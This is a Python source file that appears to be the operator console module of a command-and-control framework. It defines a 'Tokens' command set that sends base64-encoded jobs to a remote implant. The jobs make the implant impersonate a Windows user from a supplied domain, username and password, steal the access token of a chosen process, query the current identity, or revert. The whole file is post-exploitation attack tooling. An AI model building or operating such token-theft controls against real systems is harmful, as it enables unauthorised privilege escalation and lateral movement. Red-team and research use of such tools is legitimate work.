import argparse

from connect.convert import string_to_base64
from cmd2 import Cmd2ArgumentParser, CommandSet, Statement, with_argparser, with_default_category


@with_default_category('Tokens')
class TokenCommands(CommandSet):
    """
    The token command set.
    """

    def __init__(self, post_job):
        super().__init__()
        self.post_job = post_job

    def do_rev2self(self, _: Statement):
        """ Drops all impersonated tokens. """
        self.post_job(f'"name":"rev2self","arguments":"","type":1')

    def do_get_token(self, _: Statement):
        """ Retrieve the identity of the impersonated token. """
        self.post_job(f'"name":"get_token","arguments":"","type":1')

    make_token_parser = Cmd2ArgumentParser()
    make_token_parser.add_argument('domain', help='The domain to impersonate for')
    make_token_parser.add_argument('username', help='User to impersonate')
    make_token_parser.add_argument('password', help='The password of the user')

    @with_argparser(make_token_parser)
    def do_make_token(self, args: argparse.Namespace):
        """ Impersonate a user's token. """
        domain_b64 = string_to_base64(args.domain)
        user_b64 = string_to_base64(args.username)
        password_b64 = string_to_base64(args.password)
        self.post_job(f'"name":"make_token","arguments":"{domain_b64},{user_b64},{password_b64}","type":1')

    steal_token_parser = Cmd2ArgumentParser()
    steal_token_parser.add_argument('pid', help='The pid of the process to impersonate.')

    @with_argparser(steal_token_parser)
    def do_steal_token(self, args: argparse.Namespace):
        """ Impersonate a processes token. """
        pid_b64 = string_to_base64(args.pid)
        self.post_job(f'"name":"steal_token","arguments":"{pid_b64}","type":1')
